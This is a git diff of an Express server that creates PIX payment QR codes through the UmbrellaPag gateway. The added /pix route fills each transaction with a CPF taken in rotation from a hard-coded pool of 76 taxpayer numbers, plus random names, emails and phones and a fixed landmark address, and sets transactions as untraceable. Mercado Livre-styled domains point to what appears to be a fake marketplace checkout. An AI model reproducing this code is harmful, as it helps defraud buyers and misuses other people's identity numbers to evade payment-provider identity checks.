@@ -6,7 +6,7 @@ import helmet from 'helmet';
 import morgan from 'morgan';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { createPixTransaction } from './umbrellapagClient.js';
+// import { createPixTransaction } from './umbrellapagClient.js'; // REMOVIDO - usando edge function agora
 
 // Para usar __dirname em ES modules
 const __filename = fileURLToPath(import.meta.url);
@@ -31,27 +31,12 @@ app.use(helmet({
       styleSrc: ["'self'", "'unsafe-inline'", "https://http2.mlstatic.com"],
       fontSrc: ["'self'", "https://http2.mlstatic.com", "data:"],
       imgSrc: ["'self'", "data:", "https:", "http:"],
-      connectSrc: [
-        "'self'", 
-        "http://localhost:3000", 
-        "http://localhost:3001", 
-        "http://127.0.0.1:3000", 
-        "http://127.0.0.1:3001",
-        "https://pagamentoseguromarketplace.com",
-        "http://pagamentoseguromarketplace.com"
-      ],
+      connectSrc: ["'self'", "http://localhost:3000", "http://localhost:3001", "http://127.0.0.1:3000", "http://127.0.0.1:3001"],
     },
   },
 }));
 app.use(cors({
-  origin: [
-    'http://localhost:3000', 
-    'http://127.0.0.1:3000', 
-    'http://localhost:3001', 
-    'http://127.0.0.1:3001',
-    'https://pagamentoseguromarketplace.com',
-    'http://pagamentoseguromarketplace.com'
-  ],
+  origin: ['http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:3001', 'http://127.0.0.1:3001'],
   credentials: true
 }));
 app.use(express.json({ limit: '1mb' }));
@@ -95,10 +80,7 @@ app.use((err, req, res, next) => {
       error: true,
       message: 'JSON malformado na requisição',
       details: err.message,
-      position: (function() {
-        const match = err.message.match(/position (\d+)/);
-        return match ? match[1] : 'desconhecido';
-      })(),
+      position: (err.message.match(/position (\d+)/) && err.message.match(/position (\d+)/)[1]) || 'desconhecido',
     });
   }
   next();
@@ -108,7 +90,282 @@ app.get('/health', (req, res) => {
   res.json({ ok: true, uptime: process.uptime() });
 });
 
+// Pool de CPFs para rotação
+const CPF_POOL = [
+  "45920621320", "45920710268", "45921075191", "45921270300", "45921660353",
+  "45921776300", "45922071220", "08686768709", "17330410799", "07417952720",
+  "04210889660", "46312218287", "46312285200", "45920252880", "46312480259",
+  "46529268200", "45920222115", "45920222549", "45920435291", "44876319391",
+  "44877135871", "44876807272", "44877447253", "44877463372", "44877676287",
+  "44877170359", "44877331387", "44877420215", "45143331315", "45369526249",
+  "45144338372", "45144605168", "45145032315", "45145326300", "45321957304",
+  "45322325387", "44804067353", "44804440097", "44802528515", "44802930860",
+  "44803125368", "44803214387", "44803303134", "44803702349", "44805106808",
+  "44805277882", "44806345334", "44807120387", "44807988387", "44810304884",
+  "44810406881", "44811098315", "44809646300", "44811390130", "44813031315",
+  "44810752879", "44811063520", "44801971334", "44754043391", "45633428315",
+  "44719221300", "45318204287", "45318395104", "44869479400", "44870973200",
+  "45321710325", "44733372272", "44771886504", "45578117368", "44733690215",
+  "45562199220", "46466142353", "46467084349", "44757905149", "44811640349",
+  "46467106253"
+];
+
+let cpfIndex = 0;
+
+// Função para obter próximo CPF (rotação)
+function getNextCpf() {
+  const cpf = CPF_POOL[cpfIndex];
+  cpfIndex = (cpfIndex + 1) % CPF_POOL.length;
+  return cpf;
+}
+
+// Função para gerar nome aleatório
+function generateRandomName() {
+  const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Julia', 'Lucas', 'Fernanda', 'Rafael', 'Mariana', 'Gabriel', 'Beatriz', 'Rodrigo', 'Camila', 'Thiago', 'Larissa'];
+  const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Lima', 'Araújo', 'Ferreira', 'Ribeiro', 'Carvalho', 'Gomes', 'Martins'];
+  return `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
+}
+
+// Função para gerar email aleatório
+function generateRandomEmail() {
+  const domains = ['gmail.com', 'hotmail.com', 'yahoo.com.br', 'outlook.com', 'uol.com.br'];
+  const names = ['user', 'cliente', 'teste', 'pessoa', 'contato', 'email'];
+  const random = Math.floor(Math.random() * 10000);
+  const domain = domains[Math.floor(Math.random() * domains.length)];
+  const name = names[Math.floor(Math.random() * names.length)];
+  return `${name}${random}@${domain}`;
+}
+
+// Função para gerar telefone aleatório
+function generateRandomPhone() {
+  const ddd = ['11', '21', '31', '41', '47', '48', '51', '61', '71', '81', '85'];
+  const randomDdd = ddd[Math.floor(Math.random() * ddd.length)];
+  const number = Math.floor(100000000 + Math.random() * 900000000);
+  return `${randomDdd}${number}`;
+}
+
+// Rota para gerar QR Code PIX diretamente
+app.post('/pix', async (req, res) => {
+  try {
+    console.log('\n' + '='.repeat(70));
+    console.log('📥 Requisição recebida:', JSON.stringify(req.body, null, 2));
+    
+    const UMBRELLA_API_URL = "https://api-gateway.umbrellapag.com/api/user/transactions";
+    const UMBRELLA_TOKEN = process.env.UMBRELLAPAG_API_KEY;
+    
+    if (!UMBRELLA_TOKEN) {
+      return res.status(400).json({
+        success: false,
+        error: "Missing UMBRELLAPAG_API_KEY in environment variables."
+      });
+    }
+
+    const { amount } = req.body;
+    
+    // Validações
+    if (!amount || amount < 1) {
+      return res.status(400).json({
+        success: false,
+        error: 'Invalid amount (minimum 1.00).'
+      });
+    }
+
+    // Validação de valor máximo (R$ 3.000,00 conforme erro da API)
+    if (amount > 3000) {
+      return res.status(400).json({
+        success: false,
+        error: 'O valor máximo permitido para transações é de R$ 3.000,00.'
+      });
+    }
+    
+    // Gera dados aleatórios automaticamente (rotação de CPF)
+    const name = req.body.name || generateRandomName();
+    const email = req.body.email || generateRandomEmail();
+    const document = req.body.document || getNextCpf();
+    const phone = req.body.phone || generateRandomPhone();
+    
+    console.log('📋 Dados gerados:', { name, email, document, phone });
+
+    // Processamento
+    const amountInCents = Math.round(amount * 100);
+    let clientIp = req.ip || req.headers['x-forwarded-for'] || "127.0.0.1";
+    
+    // Converte IPv6 para IPv4 se necessário
+    if (clientIp.includes('::ffff:')) {
+      clientIp = clientIp.replace('::ffff:', '');
+    }
+    if (clientIp.includes(',')) {
+      clientIp = clientIp.split(',')[0].trim();
+    }
+    
+    const documentClean = document.replace(/\D/g, '');
+    if (documentClean.length !== 11 && documentClean.length !== 14) {
+      return res.status(400).json({
+        success: false,
+        error: 'Documento inválido: deve ter 11 (CPF) ou 14 (CNPJ) dígitos'
+      });
+    }
+    
+    const documentType = documentClean.length === 11 ? 'CPF' : 'CNPJ';
+    
+    let phoneClean = phone ? phone.replace(/\D/g, '') : '11999999999';
+    if (phoneClean.length < 10 || phoneClean.length > 11) {
+      phoneClean = '11999999999';
+    }
+
+    // Payload - conforme documentação oficial da API UmbrellaPag
+    const externalRef = `tx_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    
+    const transactionPayload = {
+      amount: amountInCents,
+      currency: "BRL",
+      paymentMethod: "PIX",
+      installments: 1,
+      traceable: false,
+      ip: clientIp,
+      postbackUrl: process.env.POSTBACK_URL || "https://webhook.site/unique-id", // OBRIGATÓRIO
+      metadata: JSON.stringify({
+        source: "pix_qrcode_generator",
+        timestamp: new Date().toISOString()
+      }), // OBRIGATÓRIO
+      customer: {
+        name: name,
+        email: email,
+        phone: phoneClean,
+        externalRef: externalRef, // OBRIGATÓRIO
+        document: {
+          type: documentType,
+          number: documentClean
+        },
+        address: {
+          zipCode: "01001000",
+          street: "Praça da Sé",
+          streetNumber: "1",
+          complement: "",
+          neighborhood: "Sé",
+          city: "São Paulo",
+          state: "SP",
+          country: "BR"
+        }
+      },
+      items: [
+        {
+          title: "Pagamento PIX",
+          unitPrice: amountInCents,
+          quantity: 1,
+          tangible: false,
+          externalRef: externalRef
+        }
+      ],
+      pix: {
+        expiresInDays: 1
+      }
+    };
+
+    console.log('📤 Payload para UmbrellaPag:', JSON.stringify(transactionPayload, null, 2));
+
+    // Chama API UmbrellaPag
+    const umbrellaRes = await fetch(UMBRELLA_API_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': UMBRELLA_TOKEN,
+        'User-Agent': 'UMBRELLAB2B/1.0'
+      },
+      body: JSON.stringify(transactionPayload)
+    });
+
+    console.log(`📥 Status da API: ${umbrellaRes.status} ${umbrellaRes.statusText}`);
+
+    const responseText = await umbrellaRes.text();
+    console.log('📥 Resposta da API:', responseText);
+
+    let umbrellaData;
+    try {
+      umbrellaData = JSON.parse(responseText);
+    } catch (e) {
+      return res.status(500).json({
+        success: false,
+        error: `Umbrella API Error (Non-JSON): ${umbrellaRes.status} ${umbrellaRes.statusText}`
+      });
+    }
+
+    if (!umbrellaRes.ok) {
+      const errorMsg = umbrellaData?.message || umbrellaData?.error || JSON.stringify(umbrellaData);
+      const refusedReason = umbrellaData?.error?.refusedReason || umbrellaData?.refusedReason || '';
+      
+      return res.status(400).json({
+        success: false,
+        error: refusedReason || errorMsg,
+        details: {
+          status: umbrellaData?.status,
+          message: umbrellaData?.message,
+          refusedReason: refusedReason,
+          provider: umbrellaData?.error?.provider
+        }
+      });
+    }
+
+    // Extrai QR Code
+    const transactionId = umbrellaData.data?.id || umbrellaData.id;
+    const pixData = umbrellaData.data?.pix || umbrellaData.pix || {};
+    const paymentData = umbrellaData.data || umbrellaData;
+    
+    const pixCode = paymentData.qrCode || 
+                    pixData.qrcode || 
+                    pixData.qrCode || 
+                    pixData.copiaECola || 
+                    pixData.pixCopyPaste ||
+                    paymentData.pix?.qrcode ||
+                    paymentData.pix?.qrCode;
+
+    console.log('✅ QR Code extraído:', pixCode ? `${pixCode.substring(0, 50)}...` : 'NÃO ENCONTRADO');
+
+    if (!transactionId) {
+      return res.status(500).json({
+        success: false,
+        error: "Success response received but missing Transaction ID."
+      });
+    }
+
+    if (!pixCode) {
+      return res.status(500).json({
+        success: false,
+        error: "Success response received but missing PIX QR Code.",
+        debug: umbrellaData
+      });
+    }
+
+    // Resposta de sucesso
+    const response = {
+      success: true,
+      transactionId: transactionId,
+      pixCode: pixCode,
+      pix_copy_paste: pixCode,
+      amount: amountInCents,
+      amountBRL: amount,
+      status: 'pending',
+      ...(pixData.expirationDate && { expirationDate: pixData.expirationDate }),
+      ...(pixData.chave && { pixKey: pixData.chave })
+    };
+
+    console.log('✅ Resposta enviada:', JSON.stringify(response, null, 2));
+    console.log('='.repeat(70) + '\n');
+
+    res.json(response);
+
+  } catch (error) {
+    console.error('❌ Erro:', error);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
 // Create PIX transaction (proxy)
+// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
+/*
 app.post('/pix', async (req, res) => {
   try {
     console.log('📥 POST /pix recebido:', JSON.stringify(req.body, null, 2));
@@ -183,8 +440,11 @@ app.post('/pix', async (req, res) => {
     return res.status(status).json({ error: true, ...data });
   }
 });
+*/
 
 // Create PIX transaction via GET (parâmetros na URL)
+// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
+/*
 app.get('/pix', async (req, res) => {
   try {
     console.log('📥 GET /pix recebido - Query params:', JSON.stringify(req.query, null, 2));
@@ -284,9 +544,12 @@ app.get('/pix', async (req, res) => {
     return res.status(status).json({ error: true, ...data });
   }
 });
+*/
 
 // Rota simples: /:cliente/:produto/payment/:valor
 // Exemplo: http://localhost:3001/cliente/produto/payment/20.99
+// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
+/*
 app.get('/:cliente/:produto/payment/:valor', async (req, res) => {
   try {
     const { cliente, produto, valor } = req.params;
@@ -377,9 +640,12 @@ app.get('/:cliente/:produto/payment/:valor', async (req, res) => {
     return res.status(status).json({ error: true, ...data });
   }
 });
+*/
 
 // Rota simples alternativa: /:cliente/:produto?payment=valor
 // Exemplo: http://localhost:3001/cliente/produto?payment=20.99
+// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
+/*
 app.get('/:cliente/:produto', async (req, res) => {
   try {
     const { cliente, produto } = req.params;
@@ -480,6 +746,7 @@ app.get('/:cliente/:produto', async (req, res) => {
     return res.status(status).json({ error: true, ...data });
   }
 });
+*/
 
 // Endpoint para receber forma de entrega do Mercado Livre
 // Compatível com: https://mercadolivre.seguromarketplace.com/api/4
